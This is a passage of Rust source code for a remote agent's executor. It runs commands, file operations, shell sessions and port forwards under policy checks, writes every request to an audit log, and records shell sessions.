//! Command execution with policy enforcement, timeout, and output limiting.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;

use chrono::Utc;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::{Duration, timeout};

#[cfg(feature = "sysinfo")]
use tokio::sync::Mutex;

use rf_audit::logger::AuditLogger;
use rf_audit::types::AuditEntry;
use rf_crypto::secrets::SecretStore;
use rf_policy::rpc_policy::RpcPolicy;
use rf_rpc::types::{Action, Request, Response, RpcResult};

/// A completed background job.
struct CompletedJob {
    exit_code: i32,
    stdout: String,
    stderr: String,
}

/// State of a background job.
enum JobState {
    Running {
        #[allow(dead_code)] // Used for future signal forwarding
        pid: u32,
    },
    Completed(CompletedJob),
}

/// State of an active port forward.
struct ActiveForward {
    _handle: tokio::task::JoinHandle<()>,
    cancel: tokio::sync::watch::Sender<bool>,
    #[allow(dead_code)] // Kept for diagnostics/listing
    bind_addr: String,
}

/// Executor handles RPC requests under policy control.
pub struct Executor {
    policy: Arc<RwLock<RpcPolicy>>,
    audit: Arc<dyn AuditLogger>,
    caller_key: String,
    agent_id: String,
    start_time: Instant,
    /// Background jobs tracked by job ID.
    jobs: Arc<tokio::sync::Mutex<HashMap<String, JobState>>>,
    /// Active shell sessions (PTY) with optional session recorder.
    #[cfg(unix)]
    shells: Arc<
        tokio::sync::Mutex<HashMap<String, (crate::pty::PtySession, crate::pty::SessionRecorder)>>,
    >,
    /// Active port forwards.
    forwards: Arc<tokio::sync::Mutex<HashMap<String, ActiveForward>>>,
    /// Sealed secret store for `{{ secrets.KEY }}` resolution in commands.
    secrets: Option<Arc<tokio::sync::Mutex<SecretStore>>>,
    /// Cached sysinfo System to avoid re-scanning on every metrics request.
    #[cfg(feature = "sysinfo")]
    sysinfo_cache: Arc<Mutex<sysinfo::System>>,
}

impl Executor {
    pub fn new(
        policy: Arc<RwLock<RpcPolicy>>,
        audit: Arc<dyn AuditLogger>,
        caller_key: String,
    ) -> Self {
        Self {
            policy,
            audit,
            caller_key,
            agent_id: String::new(),
            start_time: Instant::now(),
            jobs: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            #[cfg(unix)]
            shells: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            forwards: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            secrets: None,
            #[cfg(feature = "sysinfo")]
            sysinfo_cache: Arc::new(Mutex::new(sysinfo::System::new_all())),
        }
    }

    /// Set the agent ID for status reporting.
    pub fn with_agent_id(mut self, id: String) -> Self {
        self.agent_id = id;
        self
    }

    /// Set the start time for uptime calculation.
    pub fn with_start_time(mut self, start: Instant) -> Self {
        self.start_time = start;
        self
    }

    /// Set the sealed secret store for `{{ secrets.KEY }}` resolution.
    pub fn with_secrets(mut self, secrets: Arc<tokio::sync::Mutex<SecretStore>>) -> Self {
        self.secrets = Some(secrets);
        self
    }

    /// Resolve `{{ secrets.KEY }}` patterns in a command string using the secret store.
    async fn resolve_secrets(&self, command: &str) -> Result<String, String> {
        if !command.contains("{{ secrets.") {
            return Ok(command.to_string());
        }
        match &self.secrets {
            Some(store) => {
                let store = store.lock().await;
                store
                    .resolve_template(command)
                    .map_err(|e| format!("secret resolution failed: {e}"))
            }
            None => Err("secrets not configured".to_string()),
        }
    }

    /// Handle an incoming RPC request.
    pub async fn handle(&self, request: Request) -> Response {
        let start = Instant::now();

        let result = match &request.action {
            Action::Execute {
                command,
                env,
                workdir,
            } => {
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
            #[cfg(feature = "sysinfo")]
            Action::Metrics => self.handle_metrics(&request.id, start).await,
            #[cfg(not(feature = "sysinfo"))]
            Action::Metrics => RpcResult::Error {
                message: "metrics not available (compiled without sysinfo feature)".into(),
            },
            Action::Status => self.handle_status(&request.id, start),
            Action::Read { path } => self.handle_read(&request.id, path, start).await,
            Action::Write { path, data, mode } => {
                self.handle_write(&request.id, path, data, *mode, start)
                    .await
            }
            Action::List { path } => self.handle_list(&request.id, path, start).await,
            Action::Signal { pid, signal } => self.handle_signal(&request.id, *pid, *signal, start),
            Action::BackgroundExec {
                command,
                env,
                workdir,
            } => {
                self.handle_background_exec(&request.id, command, env, workdir, start)
                    .await
            }
            Action::JobQuery { job_id } => self.handle_job_query(job_id).await,
            Action::JobWait { job_id } => self.handle_job_wait(job_id).await,
            Action::Ping => RpcResult::Pong {
                timestamp_ms: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64,
            },
            #[cfg(unix)]
            Action::Shell {
                shell,
                rows,
                cols,
                env,
            } => {
                self.handle_shell_open(&request.id, shell.clone(), *rows, *cols, env.clone(), start)
                    .await
            }
            #[cfg(not(unix))]
            Action::Shell { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellInput { session_id, data } => {
                self.handle_shell_input(&request.id, session_id, data, start)
                    .await
            }
            #[cfg(not(unix))]
            Action::ShellInput { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellResize {
                session_id,
                rows,
                cols,
            } => self.handle_shell_resize(session_id, *rows, *cols).await,
            #[cfg(not(unix))]
            Action::ShellResize { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellClose { session_id } => {
                self.handle_shell_close(&request.id, session_id, start)
                    .await
            }
            #[cfg(not(unix))]
            Action::ShellClose { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            Action::PortForward {
                bind_addr,
                target_addr,
            } => {
                self.handle_port_forward(&request.id, bind_addr, target_addr, start)
                    .await
            }
            Action::PortForwardClose { forward_id } => {
                self.handle_port_forward_close(&request.id, forward_id, start)
                    .await
            }
            Action::RemoteForward {
                bind_addr,
                target_addr,
            } => {
                self.handle_remote_forward(&request.id, bind_addr, target_addr, start)
                    .await
            }
            Action::Socks5Forward { bind_addr } => {
                self.handle_socks5_forward(&request.id, bind_addr, start)
                    .await
            }
            Action::Socks5Close { forward_id } => {
                self.handle_port_forward_close(&request.id, forward_id, start)
                    .await
            }
            Action::HealthCheck {
                probe_type,
                target,
                timeout_ms,
            } => {
                self.handle_health_check(&request.id, probe_type, target, *timeout_ms, start)
                    .await
            }
            Action::TailLog { path, lines } => {
                self.handle_tail_log(&request.id, path, *lines, start).await
            }
            Action::StreamExecute {
                command,
                env,
                workdir,
            } => {
                // StreamExecute runs synchronously (like Execute) when no streaming
                // channel is available. The full streaming path uses stream_execute()
                // directly from the agent's RPC loop with a mpsc sender.
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
            Action::FilePush {
                path,
                offset,
                data,
                done,
                checksum,
                mode,
            } => {
                self.handle_file_push(
                    &request.id,
                    path,
                    *offset,
                    data,
                    *done,
                    checksum,
                    *mode,
                    start,
                )
                .await
            }
            Action::FilePull {
                path,
                offset,
                max_chunk,
            } => {
                self.handle_file_pull(&request.id, path, *offset, *max_chunk, start)
                    .await
            }
            Action::Proxy {
                target,
                idle_timeout_secs,
                max_duration_secs,
            } => {
                self.handle_proxy(
                    &request.id,
                    target,
                    *idle_timeout_secs,
                    *max_duration_secs,
                    start,
                )
                .await
            }
            _ => RpcResult::Error {
                message: format!("unsupported action: {:?}", request.action),
            },
        };

        Response {
            id: request.id,
            result,
        }
    }

    /// Write an audit log entry, logging errors via tracing.
    fn audit(
        &self,
        request_id: &str,
        action: &str,
        command: Option<String>,
        decision: &str,
        matched_rule: String,
        exit_code: Option<i32>,
        duration_ms: u64,
    ) {
        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: action.into(),
            command,
            decision: decision.into(),
            matched_rule,
            exit_code,
            duration_ms,
            caller_key: self.caller_key.clone(),
            reason: None,
        }) {
            tracing::error!("audit log write failed: {e}");
        }
    }

    async fn handle_execute(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Policy check
        let decision = policy.check_command(command);
        let duration_ms = start.elapsed().as_millis() as u64;

        if !decision.allowed {
            if let Err(e) = self.audit.log(AuditEntry {
                timestamp: Utc::now(),
                request_id: request_id.to_string(),
                action: "execute".into(),
                command: Some(command.to_string()),
                decision: "denied".into(),
                matched_rule: decision.matched_rule.clone(),
                exit_code: None,
                duration_ms,
                caller_key: self.caller_key.clone(),
                reason: None,
            }) {
                tracing::error!("audit log write failed: {}", e);
            }

            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }

        // Execute with timeout
        let timeout_dur = Duration::from_secs(policy.timeout_seconds as u64);
        let max_output = policy.max_output_bytes as usize;
        drop(policy); // Release read lock before spawning

        // Resolve {{ secrets.KEY }} patterns in the command
        let resolved_command = match self.resolve_secrets(command).await {
            Ok(cmd) => cmd,
            Err(e) => {
                return RpcResult::Error { message: e };
            }
        };

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(&resolved_command);

        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }

        for (k, v) in env {
            cmd.env(k, v);
        }

        let output = match timeout(timeout_dur, cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
            Err(_) => {
                return RpcResult::Error {
                    message: format!("timeout after {}s", timeout_dur.as_secs()),
                };
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout[..output.stdout.len().min(max_output)])
            .to_string();
        let stderr = String::from_utf8_lossy(&output.stderr[..output.stderr.len().min(max_output)])
            .to_string();
        let exit_code = output.status.code().unwrap_or(-1);
        let duration_ms = start.elapsed().as_millis() as u64;

        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: "execute".into(),
            command: Some(command.to_string()),
            decision: "allowed".into(),
            matched_rule: decision.matched_rule,
            exit_code: Some(exit_code),
            duration_ms,
            caller_key: self.caller_key.clone(),
            reason: None,
        }) {
            tracing::error!("audit log write failed: {}", e);
        }

        RpcResult::Success {
            stdout,
            stderr,
            exit_code,
            duration_ms,
        }
    }

    #[cfg(feature = "sysinfo")]
    async fn handle_metrics(&self, request_id: &str, start: Instant) -> RpcResult {
        let mut sys = self.sysinfo_cache.lock().await;
        sys.refresh_all();
        let stdout = format!(
            "{{\"hostname\":\"{}\",\"cpus\":{},\"memory_total_mb\":{},\"memory_used_mb\":{}}}",
            sysinfo::System::host_name().unwrap_or_default(),
            sys.cpus().len(),
            sys.total_memory() / 1024 / 1024,
            sys.used_memory() / 1024 / 1024,
        );

        self.audit(
            request_id,
            "metrics",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
        );

        RpcResult::Success {
            stdout,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_status(&self, request_id: &str, start: Instant) -> RpcResult {
        self.audit(
            request_id,
            "status",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
        );
        RpcResult::StatusInfo {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_seconds: self.start_time.elapsed().as_secs(),
        }
    }

    async fn handle_read(&self, request_id: &str, path: &str, start: Instant) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check (check_path resolves symlinks internally)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "read",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        // Resolve for actual read
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        match tokio::fs::read(&resolved).await {
            Ok(data) => {
                let truncated = if data.len() > max_output {
                    data[..max_output].to_vec()
                } else {
                    data
                };
                // Return file content as base64 in stdout
                use base64::Engine;
                let encoded = base64::engine::general_purpose::STANDARD.encode(&truncated);
                self.audit(
                    request_id,
                    "read",
                    Some(path.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::Success {
                    stdout: encoded,
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("read file: {e}"),
            },
        }
    }

    async fn handle_write(
        &self,
        request_id: &str,
        path: &str,
        data: &[u8],
        mode: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "write",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Atomic write: write to temp file then rename
        let temp_path = format!("{path}.rf_tmp");
        if let Err(e) = tokio::fs::write(&temp_path, data).await {
            return RpcResult::Error {
                message: format!("write temp file: {e}"),
            };
        }

        // Set permissions if specified (Unix only)
        #[cfg(unix)]
        if let Some(m) = mode {
            use std::os::unix::fs::PermissionsExt;
            let perms = std::fs::Permissions::from_mode(m);
            if let Err(e) = tokio::fs::set_permissions(&temp_path, perms).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("set permissions: {e}"),
                };
            }
        }
        // On non-Unix, mode is ignored
        #[cfg(not(unix))]
        let _ = mode;

        // Atomic rename
        if let Err(e) = tokio::fs::rename(&temp_path, path).await {
            let _ = tokio::fs::remove_file(&temp_path).await;
            return RpcResult::Error {
                message: format!("rename: {e}"),
            };
        }

        self.audit(
            request_id,
            "write",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
        );

        RpcResult::Success {
            stdout: format!("wrote {} bytes to {}", data.len(), path),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    async fn handle_list(&self, request_id: &str, path: &str, start: Instant) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "list",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        let mut entries = Vec::new();
        let mut dir = match tokio::fs::read_dir(&resolved).await {
            Ok(d) => d,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read dir: {e}"),
                };
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = entry.file_type().await.map(|t| t.is_dir()).unwrap_or(false);
            entries.push(if is_dir { format!("{name}/") } else { name });
        }

        entries.sort();
        self.audit(
            request_id,
            "list",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
        );
        RpcResult::Success {
            stdout: entries.join("\n"),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_signal(&self, request_id: &str, pid: u32, signal: i32, start: Instant) -> RpcResult {
        // Policy check — treat signal as a command
        let cmd_repr = format!("kill -{signal} {pid}");
        let policy = self.policy.blocking_read();
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "signal",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        #[cfg(unix)]
        {
            // Send signal to process
            let result = unsafe { libc::kill(pid as libc::pid_t, signal as libc::c_int) };
            if result == 0 {
                self.audit(
                    request_id,
                    "signal",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::Success {
                    stdout: format!("signal {signal} sent to pid {pid}"),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            } else {
                self.audit(
                    request_id,
                    "signal",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(-1),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::Error {
                    message: format!(
                        "kill({}, {}): {}",
                        pid,
                        signal,
                        std::io::Error::last_os_error()
                    ),
                }
            }
        }
        #[cfg(not(unix))]
        {
            let _ = (pid, signal, cmd_repr, matched_rule, request_id, start);
            RpcResult::Error {
                message: "signal not supported on this platform".into(),
            }
        }
    }

    async fn handle_background_exec(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
    ) -> RpcResult {
        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_command(command);
        if !decision.allowed {
            self.audit(
                request_id,
                "background_exec",
                Some(command.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);
        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }
        for (k, v) in env {
            cmd.env(k, v);
        }

        let child = match cmd
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
        };

        let pid = child.id().unwrap_or(0);
        let job_id = uuid::Uuid::new_v4().to_string();

        // Store job as running
        {
            let mut jobs = self.jobs.lock().await;
            jobs.insert(job_id.clone(), JobState::Running { pid });
        }

        self.audit(
            request_id,
            "background_exec",
            Some(command.to_string()),
            "allowed",
            matched_rule,
            None,
            start.elapsed().as_millis() as u64,
        );

        // Spawn background task to wait for completion
        let jobs = self.jobs.clone();
        let job_id_clone = job_id.clone();
        tokio::spawn(async move {
            match child.wait_with_output().await {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(
                        &output.stdout[..output.stdout.len().min(max_output)],
                    )
                    .to_string();
                    let stderr = String::from_utf8_lossy(
                        &output.stderr[..output.stderr.len().min(max_output)],
                    )
                    .to_string();
                    let exit_code = output.status.code().unwrap_or(-1);
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code,
                            stdout,
                            stderr,
                        }),
                    );
                }
                Err(_) => {
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code: -1,
                            stdout: String::new(),
                            stderr: "process wait failed".into(),
                        }),
                    );
                }
            }
        });

        RpcResult::JobStarted { job_id, pid }
    }

    async fn handle_job_query(&self, job_id: &str) -> RpcResult {
        let jobs = self.jobs.lock().await;
        match jobs.get(job_id) {
            Some(JobState::Running { .. }) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: true,
                exit_code: None,
                stdout: None,
                stderr: None,
            },
            Some(JobState::Completed(job)) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: false,
                exit_code: Some(job.exit_code),
                stdout: Some(job.stdout.clone()),
                stderr: Some(job.stderr.clone()),
            },
            None => RpcResult::Error {
                message: format!("unknown job: {job_id}"),
            },
        }
    }

    async fn handle_job_wait(&self, job_id: &str) -> RpcResult {
        // Poll until complete (with timeout)
        let deadline = tokio::time::Instant::now() + Duration::from_secs(300);
        loop {
            {
                let jobs = self.jobs.lock().await;
                if let Some(JobState::Completed(job)) = jobs.get(job_id) {
                    return RpcResult::JobStatus {
                        job_id: job_id.into(),
                        running: false,
                        exit_code: Some(job.exit_code),
                        stdout: Some(job.stdout.clone()),
                        stderr: Some(job.stderr.clone()),
                    };
                }
                if !jobs.contains_key(job_id) {
                    return RpcResult::Error {
                        message: format!("unknown job: {job_id}"),
                    };
                }
            }
            if tokio::time::Instant::now() > deadline {
                return RpcResult::Error {
                    message: format!("timeout waiting for job: {job_id}"),
                };
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }

    // --- Shell session handlers ---

    #[cfg(unix)]
    async fn handle_shell_open(
        &self,
        request_id: &str,
        shell: Option<String>,
        rows: u16,
        cols: u16,
        env: HashMap<String, String>,
        start: Instant,
    ) -> RpcResult {
        use crate::pty::{PtyConfig, PtySession, SessionRecorder, TerminalSize};

        // Policy check — opening a shell is equivalent to running the shell command
        let shell_bin = shell
            .clone()
            .or_else(|| std::env::var("SHELL").ok())
            .unwrap_or_else(|| "/bin/sh".to_string());
        let policy = self.policy.read().await;
        let decision = policy.check_command(&shell_bin);
        if !decision.allowed {
            self.audit(
                request_id,
                "shell_open",
                Some(shell_bin.clone()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let config = PtyConfig {
            shell,
            size: TerminalSize { rows, cols },
            cwd: None,
            env: env.into_iter().collect(),
            timeout_secs: 3600,
            record: true,
        };

        match PtySession::spawn(config) {
            Ok(session) => {
                let session_id = uuid::Uuid::new_v4().to_string();
                // Create session recorder for replay-grade traceability
                let now_ms = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64;
                let recorder = SessionRecorder::new(cols, rows, now_ms);
                let mut shells = self.shells.lock().await;
                shells.insert(session_id.clone(), (session, recorder));
                self.audit(
                    request_id,
                    "shell_open",
                    Some(shell_bin.clone()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ShellOpened { session_id }
            }
            Err(e) => RpcResult::Error {
                message: format!("PTY spawn failed: {e}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_input(
        &self,
        request_id: &str,
        session_id: &str,
        data: &[u8],
        start: Instant,
    ) -> RpcResult {
        self.audit(
            request_id,
            "shell_input",
            Some(session_id.to_string()),
            "allowed",
            "shell-session".into(),
            None,
            start.elapsed().as_millis() as u64,
        );

        let now_ms = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64;

        let mut shells = self.shells.lock().await;
        match shells.get_mut(session_id) {
            Some((session, recorder)) => {
                // Record input event
                let input_str = String::from_utf8_lossy(data);
                recorder.record_input(&input_str, now_ms);

                match session.write(data) {
                    Ok(_) => {
                        // Read back any available output
                        let mut buf = vec![0u8; 8192];
                        // Small delay to let the shell process the input
                        drop(shells);
                        tokio::time::sleep(Duration::from_millis(10)).await;
                        let mut shells = self.shells.lock().await;
                        if let Some((session, recorder)) = shells.get_mut(session_id) {
                            let read_time_ms = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_millis() as u64;
                            match session.read(&mut buf) {
                                Ok(0) => RpcResult::ShellOutput {
                                    session_id: session_id.to_string(),
                                    data: Vec::new(),
                                },
                                Ok(n) => {
                                    // Record output event
                                    let output_str = String::from_utf8_lossy(&buf[..n]);
                                    recorder.record_output(&output_str, read_time_ms);
                                    RpcResult::ShellOutput {
                                        session_id: session_id.to_string(),
                                        data: buf[..n].to_vec(),
                                    }
                                }
                                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                    RpcResult::ShellOutput {
                                        session_id: session_id.to_string(),
                                        data: Vec::new(),
                                    }
                                }
                                Err(e) => RpcResult::Error {
                                    message: format!("PTY read error: {e}"),
                                },
                            }
                        } else {
                            RpcResult::Error {
                                message: "session disappeared".into(),
                            }
                        }
                    }
                    Err(e) => RpcResult::Error {
                        message: format!("PTY write error: {e}"),
                    },
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_resize(&self, session_id: &str, rows: u16, cols: u16) -> RpcResult {
        use crate::pty::TerminalSize;
        let shells = self.shells.lock().await;
        match shells.get(session_id) {
            Some((session, _recorder)) => {
                session.resize(TerminalSize { rows, cols });
                RpcResult::Success {
                    stdout: String::new(),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_close(
        &self,
        request_id: &str,
        session_id: &str,
        start: Instant,
    ) -> RpcResult {
        use crate::pty::PtySignal;
        let mut shells = self.shells.lock().await;
        match shells.remove(session_id) {
            Some((session, recorder)) => {
                let _ = session.signal(PtySignal::Sighup);

                // Emit session recording as an audit entry for replay-grade traceability
                let event_count = recorder.event_count();
                if event_count > 0 {
                    let asciicast = recorder.to_asciicast();
                    let _ = self.audit.log(AuditEntry {
                        timestamp: Utc::now(),
                        request_id: request_id.to_string(),
                        action: "shell_recording".into(),
                        command: Some(session_id.to_string()),
                        decision: "recorded".into(),
                        matched_rule: format!("{event_count} events"),
                        exit_code: None,
                        duration_ms: start.elapsed().as_millis() as u64,
                        caller_key: self.caller_key.clone(),
                        reason: Some(asciicast),
                    });
                }

                self.audit(
                    request_id,
                    "shell_close",
                    Some(session_id.to_string()),
                    "allowed",
                    "shell-session".into(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ShellExited {
                    session_id: session_id.to_string(),
                    exit_code: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    // --- Port forward handlers ---

    async fn handle_port_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        target_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::forward::start_local_forward;

        // Policy check — port forwarding is equivalent to a network command
        let cmd_repr = format!("port-forward {bind_addr} {target_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "port_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_local_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok(handle) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound = bind_addr.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "port_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("port forward bind failed: {e}"),
            },
        }
    }

    async fn handle_port_forward_close(
        &self,
        request_id: &str,
        forward_id: &str,
        start: Instant,
    ) -> RpcResult {
        let mut forwards = self.forwards.lock().await;
        match forwards.remove(forward_id) {
            Some(fwd) => {
                let _ = fwd.cancel.send(true);
                self.audit(
                    request_id,
                    "forward_close",
                    Some(forward_id.to_string()),
                    "allowed",
                    "forward-session".into(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                );
                RpcResult::ForwardStopped {
                    forward_id: forward_id.to_string(),
                }
            }
            None => RpcResult::Error {
                message: format!("forward not found: {forward_id}"),
            },
        }
    }

    async fn handle_remote_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        target_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::forward::start_remote_forward;

        // Policy check
        let cmd_repr = format!("remote-forward {bind_addr} {target_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "remote_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_remote_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok((handle, bound)) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "remote_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
